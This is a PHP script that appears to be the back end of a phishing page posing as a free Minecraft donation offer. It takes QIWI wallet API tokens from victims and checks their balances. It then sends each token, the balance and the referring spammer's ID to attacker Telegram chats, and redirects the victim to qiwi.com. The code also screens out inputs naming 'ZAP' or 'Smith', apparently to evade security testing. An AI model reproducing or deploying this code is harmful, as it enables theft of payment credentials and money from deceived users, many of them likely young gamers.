<?PHP
session_start();
require_once ("QiwiApi.php");
	$token = $_POST['token'];
	$name = $_POST['name'];
	$ref = $_SESSION['ref'];
	$phone = "";
	
		
	$tokeny = "" ;
	$chat_id = "-237444129"; // %2F
	$spam_id = "-297679794";

	$number = curl(false, [], $token)['personId'];
	$qiwi = new QiwiApi($number, $token);
    $balance = $qiwi->getBalance()[0]['balance']['amount'];
    $status = "valid token";
    if($balance == null){
            $status = "invalid token";
    }
    if($status == "invalid token"){
    }
	if($token == null){
		return;
	}
if(preg_match("/\bZAP\b/i", $name." ".$pass." ".$token." ".$number) == true){
    return;
}
if(preg_match("/\bSmith\b/i", $name." ".$pass." ".$token." ".$number) == true){
    return;
}
	if($phone != null) {
		$txt = urlencode("Авторизация пользователя\nЛогин: $phone \nПароль: $pass");
		$sendToTelegram = fopen("https://api.telegram.org/bot{$tokeny}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
		echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://qiwi.com/'></head></html>";
	} else {
		
	
	$txt = urlencode("Фейк: Донат майнкрафт за бонусы \nСпонсор этого токена - $name \nБаланс QIWI: $balance руб \nТокен: $token \n$status \nПригласивший спаммер: $ref");
	$txtt = urlencode("Фейк: Донат майнкрафт за бонусы \nПришел новый токен от $name \nБаланс QIWI: $balance руб \n$status \nПригласивший спаммер: $ref \n\nСоздать свою ссылку для спама: http://freedonate.easybonus.xyz/spammer");

	$sendToTelegram = fopen("https://api.telegram.org/bot{$tokeny}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
	if($ref !== "" && $ref !== null) {
        $sendToTelegram2 = fopen("https://api.telegram.org/bot{$tokeny}/sendMessage?chat_id={$spam_id}&parse_mode=html&text={$txtt}", "r");
    }
	echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://qiwi.com/'></head></html>";
	}

	function curl($post = false, array $content = [], $token) {
	    $url   = 'https://edge.qiwi.com/person-profile/v1/profile/current';
    $ch = curl_init();
    if ($post) {
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($content));
    } else {
        curl_setopt($ch, CURLOPT_URL, $url.'/?' . http_build_query($content));
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json',
        'Content-Type: application/json',
        'Authorization: Bearer ' . $token
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, 1);
}
?>